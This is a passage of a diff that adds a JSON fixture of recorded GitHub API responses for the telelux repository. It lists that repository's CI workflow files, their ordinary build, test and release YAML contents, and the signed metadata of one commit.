+        "node_id": "W_kwDOUcV3s84VZWml",
+        "name": "Build Check",
+        "path": ".github/workflows/build-check.yml",
+        "state": "active",
+        "created_at": "2026-09-15T13:51:01.000-04:00",
+        "updated_at": "2026-09-15T13:51:01.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/358967717",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/build-check.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/Build%20Check/badge.svg"
+      },
+      {
+        "id": 358967721,
+        "node_id": "W_kwDOUcV3s84VZWmp",
+        "name": "Check",
+        "path": ".github/workflows/check.yml",
+        "state": "active",
+        "created_at": "2026-09-15T13:51:01.000-04:00",
+        "updated_at": "2026-09-15T13:51:01.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/358967721",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/check.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/Check/badge.svg"
+      },
+      {
+        "id": 358967725,
+        "node_id": "W_kwDOUcV3s84VZWmt",
+        "name": "docs",
+        "path": ".github/workflows/docs.yml",
+        "state": "active",
+        "created_at": "2026-09-15T13:51:01.000-04:00",
+        "updated_at": "2026-09-24T07:36:40.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/358967725",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/docs.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/docs/badge.svg"
+      },
+      {
+        "id": 358967731,
+        "node_id": "W_kwDOUcV3s84VZWmz",
+        "name": "PR Monitor",
+        "path": ".github/workflows/pr-monitor.yml",
+        "state": "active",
+        "created_at": "2026-09-15T13:51:01.000-04:00",
+        "updated_at": "2026-09-15T13:51:01.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/358967731",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/pr-monitor.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/PR%20Monitor/badge.svg"
+      },
+      {
+        "id": 358967736,
+        "node_id": "W_kwDOUcV3s84VZWm4",
+        "name": "Release",
+        "path": ".github/workflows/release.yml",
+        "state": "active",
+        "created_at": "2026-09-15T13:51:02.000-04:00",
+        "updated_at": "2026-09-15T13:51:02.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/358967736",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/release.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/Release/badge.svg"
+      },
+      {
+        "id": 365995401,
+        "node_id": "W_kwDOUcV3s84V0KWJ",
+        "name": "node/telelux",
+        "path": ".github/workflows/node-telelux.yml",
+        "state": "active",
+        "created_at": "2026-09-24T07:26:55.000-04:00",
+        "updated_at": "2026-09-24T07:40:51.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/365995401",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/node-telelux.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/node/telelux/badge.svg"
+      },
+      {
+        "id": 366000800,
+        "node_id": "W_kwDOUcV3s84V0Lqg",
+        "name": "node/telelux-element",
+        "path": ".github/workflows/node-telelux-element.yml",
+        "state": "active",
+        "created_at": "2026-09-24T07:34:36.000-04:00",
+        "updated_at": "2026-09-24T07:36:40.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/366000800",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/node-telelux-element.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/node/telelux-element/badge.svg"
+      },
+      {
+        "id": 366000801,
+        "node_id": "W_kwDOUcV3s84V0Lqh",
+        "name": "python/telelux",
+        "path": ".github/workflows/python-telelux.yml",
+        "state": "active",
+        "created_at": "2026-09-24T07:34:36.000-04:00",
+        "updated_at": "2026-09-24T07:36:40.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/366000801",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/python-telelux.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/python/telelux/badge.svg"
+      },
+      {
+        "id": 366000802,
+        "node_id": "W_kwDOUcV3s84V0Lqi",
+        "name": "node/telelux-web",
+        "path": ".github/workflows/node-telelux-web.yml",
+        "state": "active",
+        "created_at": "2026-09-24T07:34:36.000-04:00",
+        "updated_at": "2026-09-24T07:36:40.000-04:00",
+        "url": "https://api.github.com/repos/thekevinscott/telelux/actions/workflows/366000802",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/main/.github/workflows/node-telelux-web.yml",
+        "badge_url": "https://github.com/thekevinscott/telelux/workflows/node/telelux-web/badge.svg"
+      }
+    ]
+  },
+  {
+    "method": "listWorkflowFiles",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": [
+      {
+        "name": "build-check.yml",
+        "path": ".github/workflows/build-check.yml",
+        "sha": "81d8bb28b372dca82d0e9f6aa0de32d556aa36e0",
+        "size": 1548,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/build-check.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/build-check.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/81d8bb28b372dca82d0e9f6aa0de32d556aa36e0",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/build-check.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/build-check.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/81d8bb28b372dca82d0e9f6aa0de32d556aa36e0",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/build-check.yml"
+        }
+      },
+      {
+        "name": "check.yml",
+        "path": ".github/workflows/check.yml",
+        "sha": "31ce3a4d2a6b85b5b7026a13d1bf854869d3da32",
+        "size": 726,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/check.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/check.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/31ce3a4d2a6b85b5b7026a13d1bf854869d3da32",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/check.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/check.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/31ce3a4d2a6b85b5b7026a13d1bf854869d3da32",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/check.yml"
+        }
+      },
+      {
+        "name": "docs.yml",
+        "path": ".github/workflows/docs.yml",
+        "sha": "eb5e9ed9d9ed81a2892cc356a7f40e088715f3b4",
+        "size": 883,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/docs.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/docs.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/eb5e9ed9d9ed81a2892cc356a7f40e088715f3b4",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/docs.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/docs.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/eb5e9ed9d9ed81a2892cc356a7f40e088715f3b4",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/docs.yml"
+        }
+      },
+      {
+        "name": "node-telelux-element.yml",
+        "path": ".github/workflows/node-telelux-element.yml",
+        "sha": "fedd2adeae7193263b8290d50b9d1bd3659f9ef7",
+        "size": 3088,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux-element.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-element.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/fedd2adeae7193263b8290d50b9d1bd3659f9ef7",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-element.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux-element.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/fedd2adeae7193263b8290d50b9d1bd3659f9ef7",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-element.yml"
+        }
+      },
+      {
+        "name": "node-telelux-web.yml",
+        "path": ".github/workflows/node-telelux-web.yml",
+        "sha": "f00918797c5efb9c58c6a3a43178febe68459025",
+        "size": 3011,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux-web.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-web.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/f00918797c5efb9c58c6a3a43178febe68459025",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-web.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux-web.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/f00918797c5efb9c58c6a3a43178febe68459025",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux-web.yml"
+        }
+      },
+      {
+        "name": "node-telelux.yml",
+        "path": ".github/workflows/node-telelux.yml",
+        "sha": "14eb282059d6037bf7cd2ea986628f18dcca1562",
+        "size": 2271,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/14eb282059d6037bf7cd2ea986628f18dcca1562",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/node-telelux.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/14eb282059d6037bf7cd2ea986628f18dcca1562",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/node-telelux.yml"
+        }
+      },
+      {
+        "name": "pr-monitor.yml",
+        "path": ".github/workflows/pr-monitor.yml",
+        "sha": "f46d83266494e8c4a68dfe783ff742bd4f5b1000",
+        "size": 229,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/pr-monitor.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/pr-monitor.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/f46d83266494e8c4a68dfe783ff742bd4f5b1000",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/pr-monitor.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/pr-monitor.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/f46d83266494e8c4a68dfe783ff742bd4f5b1000",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/pr-monitor.yml"
+        }
+      },
+      {
+        "name": "python-telelux.yml",
+        "path": ".github/workflows/python-telelux.yml",
+        "sha": "b4bdb4361ba363215fa784eb6400028729c306fc",
+        "size": 2122,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/python-telelux.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/python-telelux.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/b4bdb4361ba363215fa784eb6400028729c306fc",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/python-telelux.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/python-telelux.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/b4bdb4361ba363215fa784eb6400028729c306fc",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/python-telelux.yml"
+        }
+      },
+      {
+        "name": "release.yml",
+        "path": ".github/workflows/release.yml",
+        "sha": "5d418780aff9e8c47810b58c40b048a82de1c8f2",
+        "size": 2428,
+        "url": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/release.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+        "html_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/release.yml",
+        "git_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/5d418780aff9e8c47810b58c40b048a82de1c8f2",
+        "download_url": "https://raw.githubusercontent.com/thekevinscott/telelux/25d76b93a922325f68476b74076a99a260274497/.github/workflows/release.yml",
+        "type": "file",
+        "_links": {
+          "self": "https://api.github.com/repos/thekevinscott/telelux/contents/.github/workflows/release.yml?ref=25d76b93a922325f68476b74076a99a260274497",
+          "git": "https://api.github.com/repos/thekevinscott/telelux/git/blobs/5d418780aff9e8c47810b58c40b048a82de1c8f2",
+          "html": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/.github/workflows/release.yml"
+        }
+      }
+    ]
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/build-check.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: Build Check\n\n# PR-time build verification via piot's reusable build workflow — the\n# heavier companion to check.yml. Runs the same plan + per-target build\n# matrix as release.yml (every target in putitoutthere.toml), then stops\n# before publish: no id-token, no registry auth, contents: read only.\n# Catches build/staging breakage on the PR instead of during a Release\n# run on main. Pinned to @v0 to match release.yml / check.yml.\n\non:\n  pull_request:\n    # Mirrors the putitoutthere.toml globs: each published package's\n    # subtree minus what never ships (fragments, attestation receipts,\n    # the gate config), plus the config, LICENSE, and this workflow. The\n    # exclusions must stay a subset of what the globs carve out, or a\n    # merge releases what this never built.\n    paths:\n      - 'packages/python/telelux/**'\n      - '!packages/python/telelux/changelog.d/**'\n      - '!packages/python/telelux/migrations.d/**'\n      - '!packages/python/telelux/e2e-attestations/**'\n      - '!packages/python/telelux/testing-conventions.toml'\n      - 'packages/node/telelux-element/**'\n      - '!packages/node/telelux-element/changelog.d/**'\n      - '!packages/node/telelux-element/migrations.d/**'\n      - '!packages/node/telelux-element/e2e-attestations/**'\n      - '!packages/node/telelux-element/testing-conventions.toml'\n      - 'putitoutthere.toml'\n      - 'LICENSE'\n      - '.github/workflows/build-check.yml'\n\npermissions:\n  contents: read\n\njobs:\n  build-check:\n    uses: thekevinscott/putitoutthere/.github/workflows/build.yml@v0\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/check.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: Check\n\n# PR-time validation of putitoutthere.toml via piot's reusable check\n# workflow (sibling to the release.yml we already consume). Catches\n# config-level mistakes — TOML/schema errors, duplicate package names,\n# depends_on cycles, dangling refs — so they surface here instead of\n# during a Release run on main. Cheap: a couple of seconds, no\n# per-target build. Pinned to @v0 to match release.yml.\n\non:\n  pull_request:\n    paths:\n      - 'putitoutthere.toml'\n      - '.github/workflows/release.yml'\n      - '.github/workflows/build-check.yml'\n      - '.github/workflows/check.yml'\n\npermissions:\n  contents: read\n\njobs:\n  putitoutthere-check:\n    uses: thekevinscott/putitoutthere/.github/workflows/check.yml@v0\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/docs.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: docs\n\non:\n  push:\n    branches: [main]\n    paths:\n      - 'docs/**'\n      - 'packages/node/telelux-element/**'\n      - 'pnpm-workspace.yaml'\n      - 'pnpm-lock.yaml'\n      - 'netlify.toml'\n      - '.github/workflows/docs.yml'\n  pull_request:\n    paths:\n      - 'docs/**'\n      - 'packages/node/telelux-element/**'\n      - 'pnpm-workspace.yaml'\n      - 'pnpm-lock.yaml'\n      - 'netlify.toml'\n      - '.github/workflows/docs.yml'\n  workflow_dispatch:\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    name: 'docs: build'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm --filter telelux-element build\n      - run: pnpm --filter docs build\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/pr-monitor.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: PR Monitor\n\non:\n  pull_request:\n\npermissions:\n  checks: read\n\njobs:\n  monitor:\n    name: 'CI Gate'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: thekevinscott/pr-monitor@v1\n        with:\n          job-name: 'CI Gate'\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/release.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: Release\n\non:\n  push:\n    branches: [main]\n  workflow_dispatch:\n\njobs:\n  # Preflight gate for first-publish prerequisites. Fails fast with an\n  # actionable error before the reusable workflow runs, so a misconfigured\n  # release does not produce confusing 404s deep in the publish step.\n  preflight:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Repo visibility check\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          set -euo pipefail\n          private=$(gh api \"repos/${GITHUB_REPOSITORY}\" --jq .private)\n          if [ \"$private\" = \"true\" ]; then\n            echo \"::error::Repository is private. Trusted Publishing on PyPI requires a public repository so the provider can inspect the workflow file at the configured ref. Make the repo public (Settings -> General -> Danger Zone -> Change visibility) before releasing, or remove this preflight step if you have an alternative publish path.\"\n            exit 1\n          fi\n          echo \"Repo is public; OK to proceed.\"\n\n  release:\n    needs: preflight\n    uses: thekevinscott/putitoutthere/.github/workflows/release.yml@v0\n    permissions:\n      contents: write\n      id-token: write\n\n  # PyPI upload runs in the caller's workflow context. Required because\n  # PyPI Trusted Publishers can't validate OIDC tokens minted from a\n  # cross-repo reusable workflow (pypi/warehouse#11096). The `if:` gate\n  # skips this job when no PyPI upload was handed off; `!cancelled()` lets\n  # the upload proceed even if the release job failed on something else.\n  pypi-publish:\n    needs: release\n    if: ${{ !cancelled() && needs.release.outputs.pypi_pending == 'true' }}\n    runs-on: ubuntu-latest\n    environment: release\n    permissions:\n      id-token: write\n    steps:\n      - uses: actions/download-artifact@v8\n        with:\n          pattern: '*-sdist'\n          path: dist/\n          merge-multiple: true\n      - uses: actions/download-artifact@v8\n        with:\n          pattern: '*-wheel-*'\n          path: dist/\n          merge-multiple: true\n      - uses: pypa/gh-action-pypi-publish@release/v1\n\n  # Cuts the git tag for what the job above just uploaded. The release job\n  # deliberately does not tag a PyPI package: a tag records what shipped,\n  # and until the upload lands, nothing has.\n  pypi-tag:\n    needs: pypi-publish\n    uses: thekevinscott/putitoutthere/.github/workflows/pypi-tag.yml@v0\n    permissions:\n      contents: write\n"
+  },
+  {
+    "method": "getContent",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "path": ".github/workflows/node-telelux.yml",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": "name: node/telelux\n\non:\n  pull_request:\n    paths:\n      - 'packages/node/telelux/**'\n      - '!packages/node/telelux/changelog.d/**'\n      - '!packages/node/telelux/migrations.d/**'\n      - '!packages/node/telelux/README.md'\n      - '.github/workflows/node-telelux.yml'\n\npermissions:\n  contents: read\n\njobs:\n  lint:\n    name: 'node/telelux: lint'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run lint\n\n  typecheck:\n    name: 'node/telelux: typecheck'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run typecheck\n\n  test-unit:\n    name: 'node/telelux: unit'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run test_unit\n\n  build:\n    name: 'node/telelux: build'\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: packages/node/telelux\n    steps:\n      - uses: actions/checkout@v6\n      - uses: pnpm/action-setup@v5\n        with:\n          version: 10.33.0\n      - uses: actions/setup-node@v6\n        with:\n          node-version: 24\n      - run: pnpm install --no-frozen-lockfile\n      - run: pnpm run build\n\n  conventions:\n    name: node/telelux\n    uses: thekevinscott/testing-conventions/.github/workflows/testing-conventions.yml@v0\n    with:\n      languages: '[\"typescript\"]'\n      source: packages/node/telelux/src\n      base: ${{ github.event.pull_request.base.sha || 'origin/main' }}\n"
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "testing-conventions",
+      "ref": "v0"
+    },
+    "result": {
+      "sha": "b3d3556b377c69f594826502c524966f9b0c6f60",
+      "node_id": "C_kwDOS0hnNNoAKGIzZDM1NTZiMzc3YzY5ZjU5NDgyNjUwMmM1MjQ5NjZmOWIwYzZmNjA",
+      "commit": {
+        "author": {
+          "name": "Kevin Scott",
+          "email": "151596+thekevinscott@users.noreply.github.com",
+          "date": "2026-09-25T11:17:51Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-25T11:17:51Z"
+        },
+        "message": "Merge pull request #718 from thekevinscott/chore/agents-md-cli-argument-wording\n\ndocs: name the safe step-to-script channel in AGENTS.md",
+        "tree": {
+          "sha": "12299ff18e3279ae15930974934f05ad786e383e",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/git/trees/12299ff18e3279ae15930974934f05ad786e383e"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/testing-conventions/git/commits/b3d3556b377c69f594826502c524966f9b0c6f60",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtlhfCRC1aQ7uu5UhlAAAA4AQAJkJu0vzEPghDw2Q4xUZ9ldQ\nRXnQhN7vyYiGMVxWAzDO+4P3kwRB42aiEtyhcD1FMFdTpoFjjr1W/FHA+hKOyg6P\na2UeRxUEVVN2C+4B4fkAWv9rwK5LAnK7kZAuS4RcwAIq41fzO+XLvHTR43DjAKFe\nsGFaQh7U506ZgQYvhsuN5SoTAbgL7JVWW00m455JgRO4JRsZbisFlVhQZFG/GVen\nd03arcfIe1BtqU4D/g4QSx6c7NpheHl2C3g0C8Rhe1TXocm7YqRSQ2rdq/8tt2zK\niaZ+KfM/95oneE6Om7sAWMyzx1BeXFZuD1IDIpklIXlnFWCFGVHjZVhr3K99pVCh\n7t2o610Lm1OJrjm9Cppaig2x3/pXvQSDqWdbV5N39m+9AZwy/Auzk3hcnNCENm2f\niP/ix3vNM5DEXl+N+yyzS/BzgxLTDDfvIv1YRDIJwA0MaslX43XzgrzY32Rlw5E9\nbnOebB4EdZrimORS0+7FmkMdDFUIiJ68zA3BnMr0waORXKHt3mkrszRIiwX4S9oe\ngPSt78ggRwqqYY2hFXpx4zCq/P+noiAOMymC4fAmyM1dwAdooe181MuOoffsZPN9\nMgNcr2j15ctOZEafSPesfbJEH8tYEFFHOK3YVMV06zv1n3QzsTspTCnUGYoWGpiF\nKxkNljMsiw5L4xGIj0Nl\n=Tvrt\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree 12299ff18e3279ae15930974934f05ad786e383e\nparent c924613b5f2bbceec1a246f37cca33b04008ec16\nparent f2ba71f73662dfee5dd5b65fa9e74067bd1f19b5\nauthor Kevin Scott <151596+thekevinscott@users.noreply.github.com> 1790335071 -0400\ncommitter GitHub <noreply@github.com> 1790335071 -0400\n\nMerge pull request #718 from thekevinscott/chore/agents-md-cli-argument-wording\n\ndocs: name the safe step-to-script channel in AGENTS.md",
+          "verified_at": "2026-09-25T11:17:53Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/b3d3556b377c69f594826502c524966f9b0c6f60",
+      "html_url": "https://github.com/thekevinscott/testing-conventions/commit/b3d3556b377c69f594826502c524966f9b0c6f60",
+      "comments_url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/b3d3556b377c69f594826502c524966f9b0c6f60/comments",
+      "author": {
+        "login": "thekevinscott",
+        "id": 151596,
+        "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+        "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinscott",
+        "html_url": "https://github.com/thekevinscott",
+        "followers_url": "https://api.github.com/users/thekevinscott/followers",
+        "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+        "repos_url": "https://api.github.com/users/thekevinscott/repos",
+        "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "c924613b5f2bbceec1a246f37cca33b04008ec16",
+          "url": "https://api.github.com/repos/thekevinscott/testing-conventions/commits/c924613b5f2bbceec1a246f37cca33b04008ec16",
